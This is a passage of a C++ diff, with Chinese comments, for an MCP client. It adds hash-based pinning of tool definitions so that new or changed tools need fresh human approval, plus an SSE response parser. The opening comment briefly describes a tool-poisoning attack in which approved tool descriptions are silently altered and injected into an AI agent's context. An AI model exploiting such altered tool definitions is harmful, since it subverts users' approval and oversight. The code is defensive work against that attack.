+//   批准后悄悄变更工具定义（描述先于任何调用就进入上下文 = 「line jumping」）。
+//   对策（OWASP LLM03 / MCP Top10 MCP03）：用内容寻址哈希把 schema 钉固到批准
+//   时的状态，之后每次 tools/list 复核。把 D107 的 approval_checksum（tool+args）
+//   推广到整张工具清单。注意：识别「首见」描述是否恶意需 ML——钉固只对「变更」
+//   与「未批准」fail-closed，绕开了这一点。
+// ════════════════════════════════════════════════════════════════
+
+/** 工具清单指纹（D118）：对 name+description+input_schema+注解做 FNV-1a。
+ *  nlohmann::json::dump() 按键排序 → 规范形式，与键序无关。 */
+inline uint64_t tool_manifest_hash(const ToolDef& t) {
+    const ToolAnnotations& a = t.annotations;
+    auto ob = [](const std::optional<bool>& o) -> const char* {
+        return o.has_value() ? (o.value() ? "1" : "0") : "-";
+    };
+    std::string canon;
+    canon += t.name;        canon += "\x1f";
+    canon += t.description; canon += "\x1f";
+    canon += (t.input_schema.is_null() ? std::string("{}") : t.input_schema.dump());
+    canon += "\x1f";
+    canon += a.title;       canon += "\x1f";
+    canon += ob(a.read_only_hint); canon += ob(a.destructive_hint);
+    canon += ob(a.idempotent_hint); canon += ob(a.open_world_hint);
+    uint64_t h = 1469598103934665603ULL;          // FNV-1a 64 offset basis
+    for (unsigned char c : canon) { h ^= c; h *= 1099511628211ULL; }
+    return h;
+}
+
+/** 工具清单钉固存储（D118）。fail-closed：首见(Unknown)与漂移(Drifted)都应
+ *  触发重新人工批准；只有 Unchanged 才放行。 */
+class ToolPinStore {
+public:
+    enum class Status { Unknown, Unchanged, Drifted };
+    /** 在人工批准时钉固工具当前清单。 */
+    void pin(const std::string& server_id, const ToolDef& t) {
+        pinned_[key(server_id, t.name)] = tool_manifest_hash(t);
+    }
+    /** 复核：未钉固→Unknown；指纹一致→Unchanged；否则→Drifted。 */
+    Status verify(const std::string& server_id, const ToolDef& t) const {
+        auto it = pinned_.find(key(server_id, t.name));
+        if (it == pinned_.end()) return Status::Unknown;
+        return it->second == tool_manifest_hash(t) ? Status::Unchanged : Status::Drifted;
+    }
+    bool is_pinned(const std::string& server_id, const std::string& tool) const {
+        return pinned_.count(key(server_id, tool)) > 0;
+    }
+    void unpin(const std::string& server_id, const std::string& tool) {
+        pinned_.erase(key(server_id, tool));
+    }
+    size_t size() const { return pinned_.size(); }
+    /** 人类可读的差异说明（哪些字段变了）。 */
+    static std::string diff(const ToolDef& old_t, const ToolDef& new_t) {
+        std::string d;
+        if (old_t.description       != new_t.description)       d += "description changed; ";
+        if (old_t.input_schema      != new_t.input_schema)      d += "input_schema changed; ";
+        if (old_t.annotations.title != new_t.annotations.title) d += "annotation title changed; ";
+        if (d.empty()) d = "no field-level change detected (hash differs)";
+        return d;
+    }
+private:
+    static std::string key(const std::string& server_id, const std::string& tool) {
+        return server_id + "::" + tool;
+    }
+    std::unordered_map<std::string, uint64_t> pinned_;
 };
 
 class ToolRegistry {
@@ -3053,6 +3727,44 @@ struct McpPrompt {
     }
 };
 
+/** 从 SSE 响应体中提取首个 JSON-RPC 消息（D116/CF1）。MCP Streamable HTTP 规定
+ *  服务器「可对任意请求以 text/event-stream 应答」，最终 JSON-RPC 响应作为 SSE
+ *  事件返回；客户端必须同时支持 application/json 与 text/event-stream 两种响应。
+ *  逐事件（空行分隔）聚合 data: 字段，返回首个可解析为对象且含 id/result/error/method
+ *  的 JSON；无匹配返回 null。纯函数，可离线单测。 */
+inline json mcp_extract_sse_message(const std::string& body) {
+    json found;
+    std::string data;
+    auto try_flush = [&]() {
+        if (found.is_null() && !data.empty()) {
+            try {
+                json j = json::parse(data);
+                if (j.is_object() && (j.contains("id") || j.contains("result")
+                        || j.contains("error") || j.contains("method")))
+                    found = j;
+            } catch (...) { /* 非 JSON data，忽略 */ }
+        }
+        data.clear();
+    };
+    size_t i = 0, n = body.size();
+    while (i < n) {
+        size_t eol = body.find('\n', i);
+        std::string line = body.substr(i, (eol == std::string::npos ? n : eol) - i);
+        i = (eol == std::string::npos ? n : eol + 1);
+        if (!line.empty() && line.back() == '\r') line.pop_back();   // 去掉 CR
+        if (line.empty()) { try_flush(); continue; }                  // 空行 = 事件边界
+        if (line.rfind("data:", 0) == 0) {
+            std::string v = line.substr(5);
+            if (!v.empty() && v.front() == ' ') v.erase(0, 1);        // 可选前导空格
+            if (!data.empty()) data += "\n";                          // 多行 data 以 \n 连接
+            data += v;
+        }
+        // event:/id:/retry: 及以 ':' 开头的注释行一律忽略
+    }
+    try_flush();   // 处理末尾无空行的事件
+    return found;
+}
+
 /** MCP 客户端：初始化 → 工具/资源/提示发现 → 调用 */
 class McpClient {
 public:
@@ -3075,11 +3787,14 @@ public:
 
     void close();
     void register_all_tools(ToolRegistry& registry);
+    // D116 — initialize 协商到的协议版本（服务器回传的 protocolVersion；默认=我们请求的版本）
+    const std::string& negotiated_protocol_version() const { return negotiated_version_; }
 
 private:
     std::unique_ptr<IMcpTransport> transport_;
     int next_id_ = 1;
     bool initialized_ = false;
+    std::string negotiated_version_;             // D116 — 协商到的协议版本
     std::vector<ToolDef> discovered_tools_;
 
     json make_request(const std::string& method, const json& params = json::object());
